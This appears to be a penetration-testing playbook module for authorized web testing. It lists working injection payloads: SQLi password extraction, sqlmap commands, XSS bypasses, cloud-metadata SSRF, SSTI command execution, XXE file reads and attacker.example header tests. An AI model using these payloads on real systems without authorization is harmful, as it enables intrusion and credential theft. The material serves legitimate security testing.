# Injection Module

Covers: SQL injection, second-order SQLi, XSS, SSRF, SSTI, XXE/XML injection, NoSQL injection, API injection, insecure deserialization, directory traversal/LFI/RFI, host header injection, email header injection, prototype pollution, type juggling, command injection indicators, LDAP/XPath injection, and parser abuse.

## Goals

- Identify all trust boundaries where attacker-controlled input reaches interpreters, parsers, templates, URLs, files, commands, databases, or browser sinks.
- Use safe detection first, then minimal proof of impact.
- Avoid destructive payloads unless the rules of engagement explicitly authorize them.

## Input Inventory

Test all input channels:

- URL query parameters
- path parameters
- JSON body fields
- form-urlencoded body fields
- multipart fields and filenames
- XML/SOAP bodies
- GraphQL variables and operation names
- WebSocket messages
- cookies
- headers: `User-Agent`, `Referer`, `Origin`, `Host`, `X-Forwarded-For`, `X-Forwarded-Host`, custom headers
- hidden form fields
- file metadata: filename, MIME type, EXIF, SVG content

## SQL Injection

### Detection

Payload classes:

```text
'
'"
' AND 1=1--
' AND 1=2--
' OR '1'='1'--
") OR ("1"="1
1 OR 1=1
1 AND 1=2
'; WAITFOR DELAY '0:0:5'--
' AND SLEEP(5)--
'; SELECT pg_sleep(5)--
```

Look for:

- SQL errors
- different content length for true/false probes
- consistent time delays
- changed result ordering/count
- out-of-band DNS/HTTP callbacks

### Database Fingerprinting

| DB | Functions | Notes |
|---|---|---|
| MySQL | `@@version`, `VERSION()`, `CONCAT()` | `#`, `-- ` comments |
| PostgreSQL | `version()`, `pg_sleep()` | string concat `||` |
| MSSQL | `@@version`, `DB_NAME()`, `WAITFOR DELAY` | string concat `+` |
| Oracle | `v$version`, `DBMS_PIPE.RECEIVE_MESSAGE` | requires `FROM dual` |

### Manual Exploitation

```text
' ORDER BY 1--
' ORDER BY 2--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL,username,password FROM users--
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a',SLEEP(5),0)--
```

### sqlmap

```bash
# Basic GET
scripts/openghost.sh exec-tool sqlmap -u "https://<target>/page?id=1" --batch --random-agent

# POST parameter
scripts/openghost.sh exec-tool sqlmap -u "https://<target>/login" --data="username=test&password=test" -p username --batch

# Authenticated request file
scripts/openghost.sh exec-tool sqlmap -r /workspace/engagements/<name>/evidence/http/request.txt --batch

# Cookie injection, marker with *
scripts/openghost.sh exec-tool sqlmap -u "https://<target>/page" --cookie="session=abc; id=1*" --level 2 --batch

# Enumerate with limited safe output
scripts/openghost.sh exec-tool sqlmap -u "https://<target>/page?id=1" --dbs --batch
scripts/openghost.sh exec-tool sqlmap -u "https://<target>/page?id=1" -D <db> --tables --batch
scripts/openghost.sh exec-tool sqlmap -u "https://<target>/page?id=1" -D <db> -T <table> --columns --batch

# WAF tamper examples
scripts/openghost.sh exec-tool sqlmap -u "https://<target>/page?id=1" --tamper=space2comment,between,randomcase,charunicodeencode --batch
```

Do not dump bulk production data. Extract schema and one redacted sample if authorized.

### Second-Order SQLi

1. Identify storage points: username, profile, comments, tickets, filenames, addresses.
2. Inject marker payload: `oghost-sqli-001'`.
3. Identify trigger points: admin pages, exports, reports, email templates, search results.
4. Visit trigger points and inspect errors/behavior.
5. Use sqlmap `--second-url` only when authorized.

## Cross-Site Scripting

### Input and Output Mapping

Identify reflected, stored, and DOM sinks.

Output contexts:

- HTML body
- HTML attribute
- JavaScript string
- template literal
- URL/href
- CSS
- HTML comment
- SVG/XML

### Context Payloads

```html
<!-- HTML body -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- HTML attribute -->
" autofocus onfocus=alert(1) x="
' autofocus onfocus=alert(1) x='

<!-- JavaScript string -->
';alert(1)//
\';alert(1)//
</script><script>alert(1)</script>

<!-- URL context -->
javascript:alert(1)
data:text/html,<script>alert(1)</script>

<!-- HTML comment -->
--><img src=x onerror=alert(1)><!--
```

### Filter Bypasses

```html
<ScRiPt>alert(1)</sCrIpT>
<details open ontoggle=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x>
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<iframe srcdoc="<script>alert(1)</script>"></iframe>
```

### DOM XSS

Sources:

```text
location, location.hash, location.search, document.URL, document.referrer, window.name, postMessage, localStorage, sessionStorage
```

Sinks:

```text
innerHTML, outerHTML, document.write, eval, Function, setTimeout(string), setInterval(string), insertAdjacentHTML, jQuery.html, Vue v-html, React dangerouslySetInnerHTML
```

Validate DOM XSS in a browser, not with curl.

### Stored and Blind XSS

Storage points:

- profile fields
- comments/reviews
- support tickets
- chat/messages
- uploaded filenames
- SVG/HTML uploads
- rich text editors
- admin notes

Use unique markers and screenshots. Avoid affecting real users.

## SSRF

### SSRF-Prone Features

- webhooks
- URL preview/unfurling
- avatar/image URL import
- PDF/screenshot generation
- file import by URL
- RSS/feed import
- OAuth callback validation
- proxy/fetch API
- integrations that fetch user-supplied URLs

### Detection

```bash
scripts/openghost.sh exec-bash 'curl -s -X POST -H "Content-Type: application/json" -d "{\"url\":\"http://<callback-host>/ssrf-test\"}" https://<target>/api/fetch'
```

Use approved OOB infrastructure only.

### Cloud Metadata

```text
AWS IMDSv1: http://169.254.169.254/latest/meta-data/
AWS role creds: http://169.254.169.254/latest/meta-data/iam/security-credentials/
GCP: http://metadata.google.internal/computeMetadata/v1/
Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01
DigitalOcean: http://169.254.169.254/metadata/v1/
```

Header requirements:

- GCP: `Metadata-Flavor: Google`
- Azure: `Metadata: true`
- AWS IMDSv2: `PUT /latest/api/token` with `X-aws-ec2-metadata-token-ttl-seconds`

### Filter Bypasses

```text
http://127.0.0.1
http://127.1
http://0
http://2130706433
http://0177.0.0.1
http://0x7f.0.0.1
http://[::1]
http://[::ffff:127.0.0.1]
http://localhost.localdomain
http://localtest.me
http://expected.com@127.0.0.1
http://127.0.0.1#expected.com
http://attacker.example/redirect?to=http://127.0.0.1
```

### Protocol Smuggling

```text
file:///etc/passwd
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_INFO
http://127.0.0.1:2375/version
```

Use protocol smuggling carefully; it can modify internal services.

## Server-Side Template Injection

### Detection Payloads

```text
{{7*7}}
${7*7}
#{7*7}
<%= 7*7 %>
{7*7}
{{= 7*7}}
${{7*7}}
#set($x=7*7)$x
```

If output contains `49`, identify the engine.

### Engine Fingerprints

```text
{{7*'7'}} -> 7777777 = Jinja2
{{7*'7'}} -> 49 = Twig
${.now} -> date = Freemarker
#{7*7} -> 49 = Thymeleaf
<%= 7*7 %> -> 49 = ERB or EJS
```

### Engine-Specific Impact Checks

```text
Jinja2 config read: {{config}}
Jinja2 safe command proof: {{cycler.__init__.__globals__.os.popen('id').read()}}
Twig command proof: {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
Freemarker: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
Velocity: #set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))
```

Attempt RCE only if authorized. A safe config read may be enough to prove high impact.

## XXE and XML Injection

### XML Processing Surfaces

- SOAP endpoints
- XML APIs
- SVG upload
- DOCX/XLSX/PPTX upload
- SAML responses
- RSS/Atom import
- XML config import

### Payloads

```xml
<!-- File read -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

<!-- PHP source read -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=config.php">]>
<foo>&xxe;</foo>

<!-- SSRF via XXE -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>
```

Blind XXE requires OOB callback infrastructure and careful payload hosting.

### Content-Type Switch

Try changing JSON endpoints to XML if parsers are lenient:

```text
Content-Type: application/xml
Accept: application/xml
```

## NoSQL Injection

### MongoDB Auth Bypass

```json
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
{"username":{"$gt":""},"password":{"$gt":""}}
{"username":"admin","password":{"$regex":".*"}}
```

Form-encoded variants:

```text
username[$ne]=invalid&password[$ne]=invalid
username[$gt]=&password[$gt]=
```

### Blind Extraction

```json
{"username":"admin","password":{"$regex":"^a"}}
{"username":"admin","password":{"$regex":"^ab"}}
```

### `$where` JavaScript

```json
{"$where":"this.username == 'admin'"}
{"$where":"sleep(5000) || this.username == 'admin'"}
```

## Insecure Deserialization

### Indicators

```text
Java: rO0AB... or hex AC ED 00 05
PHP: O:4:"User":... or a:2:{...}
.NET ViewState: __VIEWSTATE starts /wEP
Python pickle: binary starts 0x80
Ruby Marshal: BAh
```

Locations:

- cookies
- hidden fields
- signed tokens
- remember-me tokens
- ViewState
- API body fields
- message queues
- file uploads/imports

Tools and concepts:

- Java: `ysoserial` gadget chains
- PHP: `phpggc` gadget chains
- .NET: `ysoserial.net`, ViewState MAC validation
- Python: pickle `__reduce__`

Do not fire destructive gadgets. Prefer benign `id`, `whoami`, or DNS callback proofs if RCE testing is allowed.

## Directory Traversal and LFI/RFI

Payloads:

```text
../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
....//....//....//etc/passwd
..;/..;/..;/etc/passwd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
..\..\..\windows\win.ini
```

High-value files:

```text
/etc/passwd
/proc/self/environ
/var/log/nginx/access.log
/var/www/html/config.php
.env
web.config
application.yml
appsettings.json
C:\Windows\win.ini
C:\inetpub\wwwroot\web.config
```

## Host Header Injection

Test:

```bash
scripts/openghost.sh exec-bash 'curl -s -I -H "Host: attacker.example" https://<target>'
scripts/openghost.sh exec-bash 'curl -s -I -H "X-Forwarded-Host: attacker.example" https://<target>'
```

Impact paths:

- password reset poisoning
- cache poisoning
- SSRF/internal routing
- virtual host confusion
- absolute URL generation to attacker domain

## Prototype Pollution

Payloads:

```json
{"__proto__":{"isAdmin":true}}
{"constructor":{"prototype":{"isAdmin":true}}}
{"__proto__":{"polluted":"openghost"}}
```

Test in:

- JSON merge endpoints
- profile/settings update
- search filters
- query string parsers
- client-side state hydration

Client-side impact is often DOM XSS. Server-side impact may be auth bypass or RCE if a gadget exists.

## Email Header Injection

Test email, name, subject, and message fields:

```text
test@example.com%0d%0aCc:attacker@example.test
test@example.com%0aBcc:attacker@example.test
Subject%0d%0aBcc:attacker@example.test
```

Confirmed only if injected headers affect delivered email or server-side mail construction.

## Type Juggling

PHP loose comparison issues:

```text
0 == "any string"
0 == "0e12345"
"0e462097431906509019562988736854" == "0"
true == "anything"
null == ""
```

Test JSON type changes:

```json
{"password":0}
{"password":true}
{"otp":0}
{"token":null}
```

## Reporting Checklist

- Input point and exact parameter/header/body field
- Payload used
- Before/after response or timing evidence
- Interpreter/parser reached
- Confirmed impact with minimal safe proof
- Screenshots for browser findings
- Redacted sensitive data sample if data access is proven
- Specific remediation: parameterized queries, context output encoding, SSRF allowlist with DNS pinning, template sandboxing, XML external entities disabled, strict schema validation, safe deserialization, path canonicalization
